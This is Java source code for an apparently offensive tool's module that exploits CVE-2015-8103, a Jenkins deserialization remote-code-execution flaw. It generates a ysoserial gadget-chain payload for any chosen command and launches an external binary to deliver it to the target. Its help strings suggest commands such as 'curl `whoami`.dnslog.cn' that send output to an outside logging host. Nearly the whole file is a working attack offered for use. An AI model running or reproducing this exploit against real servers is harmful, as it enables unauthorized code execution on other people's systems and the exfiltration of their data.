package fun.fireline.exp.jenkins;

import fun.fireline.core.ExploitInterface;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CVE_2015_8103 implements ExploitInterface {

    private String url = "";

    @Override
    public String checkVul(String url) {
        this.url = url;
        return "[-] CVE-2015-8103 Jenkins 反序列化无回显远程代码执行,请从文件读取/命令执行模块进行判断 eg:CommonsCollections1|curl dnslog.cn (反序列化的利用链|执行的命令),反序列化利用链列表:\nBeanShell1,C3P0,Click1,Clojure,CommonsBeanutils1,CommonsCollections1,CommonsCollections2,CommonsCollections3,CommonsCollections4,CommonsCollections5,CommonsCollections6,CommonsCollections7,FileUpload1,Groovy1,Hibernate1,Hibernate2,JBossInterceptors1,JRMPClient,JRMPListener,JSON1,JavassistWeld1,Jdk7u21,Jython1,MozillaRhino1,MozillaRhino2,Myfaces1,Myfaces2,ROME,Spring1,Spring2,URLDNS,Vaadin1,Wicket1";
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        System.out.println(cmd);
        String regex = "(BeanShell1|C3P0|Click1|Clojure|CommonsBeanutils1|CommonsCollections1|CommonsCollections2|CommonsCollections3|CommonsCollections4|CommonsCollections5|CommonsCollections6|CommonsCollections7|FileUpload1|Groovy1|Hibernate1|Hibernate2|JBossInterceptors1|JRMPClient|JRMPListener|JSON1|JavassistWeld1|Jdk7u21|Jython1|MozillaRhino1|MozillaRhino2|Myfaces1|Myfaces2|ROME|Spring1|Spring2|URLDNS|Vaadin1|Wicket1).*\\|.*";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(cmd);
        if (!matcher.matches()) {
            return "提供的利用链,执行的命令格式不对,eg:CommonsCollections1|curl dnslog.cn,command允许有特殊字符,eg:curl `whoami`.dnslog.cn";
        }
        String[] all = cmd.split("\\|",2);
        String poc = all[0];
        String command = all[1];
        String command1 = String.format("java -jar ysoserial-all.jar %s \"%s\"",poc,command);
        System.out.println("exp: "+command1);
        pattern = Pattern.compile("\"[^\"]+\"|\\S+");
        matcher = pattern.matcher(command1);
        List<String> parts = new ArrayList<>();
        String part = "";
        while (matcher.find()) {
            part = matcher.group();
            parts.add(part);
        }
        File file = new File("payload.ser");
        ProcessBuilder processBuilder = new ProcessBuilder(parts);
        processBuilder.redirectOutput(file);
        try {
            Process process1 = processBuilder.start();
            regex = "http://([^/:]+)(?::(\\d+))?";
            pattern = Pattern.compile(regex);
            matcher = pattern.matcher(url);
            String domain = "";
            String port = "";
            if (matcher.find()) {
                domain = matcher.group(1);
                port = matcher.group(2);
                if (port == null) {
                    port = "80";
                }
            }
            process1.waitFor(10, TimeUnit.SECONDS);
            String os = System.getProperty("os.name").toLowerCase();
            String exp="";
            if(os.contains("win")){
                exp = "CVE_2015_8103.exe";
            }else if(os.contains("linux")){
                exp = "./CVE_2015_8103";
            }
            String command2 = String.format("%s %s %s payload.ser",exp,domain,port);
            System.out.println("exp: "+command2);
            Process process2 = Runtime.getRuntime().exec(command2);
            process2.waitFor(10, TimeUnit.SECONDS);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
        return "无回显命令执行,请自行验证";
    }


    @Override
    public boolean isVul() {
        return true;
    }
}
